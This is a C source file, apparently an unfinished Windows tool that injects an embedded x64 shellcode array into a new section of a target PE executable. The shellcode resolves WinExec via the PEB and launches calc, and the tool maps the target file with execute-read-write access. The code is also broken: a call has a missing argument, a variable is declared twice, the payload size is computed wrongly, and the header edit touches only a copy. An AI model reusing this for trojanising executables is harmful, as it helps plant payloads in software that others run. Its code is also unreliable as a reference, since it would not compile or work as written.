#include <Windows.h>
#include <stdio.h>

const unsigned char Shellcode[] = {
	0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
	0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
	0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
	0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
	0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
	0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
	0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
	0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
	0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};

int main(int argc, char* argv[]) {
	if (argc < 2) {
		printf("[!] Usage \"%s\" <.bin> <PE> <New Section name>", argv[0]);
		return -1;
	}

	LPCSTR scName = argv[1];
	PBYTE pSc = (PBYTE)Shellcode;
	SIZE_T sSc = sizeof(pSc);

	LPCSTR PeName = argv[2];
	HANDLE hPE;
	SIZE_T sPE;
	PBYTE pPE;

	LPCSTR SectionName = argv[3];

	/*if (!ReadPEFromDisk(fileName, &pFile, &sFile)) {
		return -1;
	}*/

	HANDLE hPE = CreateFileA(PeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	MapView(hPE, );

	if (!InsertCustomSection(pPE, sPE)) {
		return -1;
	}

	return 0;
}

BOOL ReadFileFromDisk(LPCSTR lpFileName, PBYTE* pFile, SIZE_T* sFile) {

	HANDLE	hFile = INVALID_HANDLE_VALUE;
	PBYTE	pBuff = NULL;
	DWORD	dwFileSize = NULL,
		dwNumberOfBytesRead = NULL;

	printf("[i] Reading \"%s\"...\n", lpFileName);

	hFile = CreateFileA(lpFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileA Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	printf("[*] CreateFile Successfully\n");

	dwFileSize = GetFileSize(hFile, NULL);
	if (dwFileSize == NULL) {
		printf("[!] GetFileSize Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	pBuff = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
	if (pBuff == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	printf("[*] Allocated buffer of File at: 0x%p\n", pBuff);

	printf("[i] File size of %s is %d\n", lpFileName, dwFileSize);

	if (!ReadFile(hFile, pBuff, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		printf("[!] ReadFile Failed With Error : %d \n", GetLastError());
		printf("[!] Bytes Read : %d of : %d \n", dwNumberOfBytesRead, dwFileSize);
		goto _EndOfFunction;
	}


_EndOfFunction:
	*pFile = (PBYTE)pBuff;
	*sFile = (SIZE_T)dwFileSize;
	if (hFile)
		CloseHandle(hFile);
	if (*pFile == NULL || *sFile == NULL)
		return FALSE;
	return TRUE;
}

BOOL MapView(IN HANDLE hPE, OUT HANDLE* hMapFile, OUT LPVOID* pMapFile) {
	
	HANDLE hMapFile;
	LPVOID pMapFile;

	DWORD SizeMap = GetFileSize(hPE, NULL);

	*hMapFile = CreateFileMappingA(hPE, NULL, PAGE_EXECUTE_READWRITE, 0,SizeMap, NULL);
	if (hMapFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileMapping failed with error: %d", GetLastError());
	}
	*pMapFile = MapViewOfFile(hMapFile, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);

}

BOOL InsertCustomSection(PBYTE pPE, SIZE_T sPE) {

	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pPE;
	PIMAGE_NT_HEADERS pImgNtHdr = (PIMAGE_NT_HEADERS)(pPE + pImgDosHdr->e_lfanew);
	IMAGE_FILE_HEADER ImgFileHdr = pImgNtHdr->FileHeader;

	printf("[i] Number of Section pre change: %d\n", ImgFileHdr.NumberOfSections);

	ImgFileHdr.NumberOfSections = ImgFileHdr.NumberOfSections + 1;

	printf("[i] Number of Section pos change: %d\n", ImgFileHdr.NumberOfSections);

	return TRUE;
}

